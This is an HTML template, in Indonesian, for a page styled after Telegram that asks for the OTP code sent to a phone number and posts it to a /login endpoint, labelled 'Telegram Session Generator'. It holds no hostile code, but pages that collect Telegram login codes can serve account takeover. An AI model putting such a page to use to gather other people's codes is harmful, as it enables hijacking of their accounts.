<!DOCTYPE html>
<html lang="id">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Telegram OTP</title>

<style>

*{
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}


body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;

    background:
    radial-gradient(circle at top,#0088cc55,transparent 40%),
    #080808;

    color:white;
}


.card{

    width:380px;
    padding:30px;

    background:rgba(255,255,255,.08);
    backdrop-filter:blur(15px);

    border:1px solid rgba(255,255,255,.15);

    border-radius:20px;

    box-shadow:0 20px 50px rgba(0,0,0,.5);
}



.logo{

    width:70px;
    height:70px;

    margin:auto;

    display:flex;
    align-items:center;
    justify-content:center;

    border-radius:50%;

    background:#0088cc;

    font-size:35px;
}



h1{

    text-align:center;
    margin-top:20px;

}



p{

    text-align:center;
    color:#aaa;
    font-size:14px;

}



input{

    width:100%;

    padding:14px;

    margin-top:20px;

    border-radius:12px;

    border:none;

    outline:none;

    background:#151515;

    color:white;

    text-align:center;

    font-size:20px;

    letter-spacing:5px;

    border:1px solid #333;

}



input:focus{

    border-color:#0088cc;

}



button{

    width:100%;

    margin-top:15px;

    padding:14px;

    border:none;

    border-radius:12px;

    background:linear-gradient(
    135deg,
    #0088cc,
    #00bfff
    );

    color:white;

    font-weight:bold;

    cursor:pointer;

}



.footer{

    text-align:center;

    color:#777;

    font-size:12px;

    margin-top:20px;

}

</style>

</head>


<body>


<div class="card">


<div class="logo">
✈️
</div>


<h1>
Masukkan OTP
</h1>


<p>
Kode verifikasi dikirim ke:
<br>
<b>{{ phone }}</b>
</p>



<form action="/login" method="POST">


<input
type="text"
name="code"
placeholder="12345"
maxlength="6"
required>



<button>
Verifikasi
</button>


</form>


<div class="footer">
Telegram Session Generator
</div>


</div>


</body>

</html>
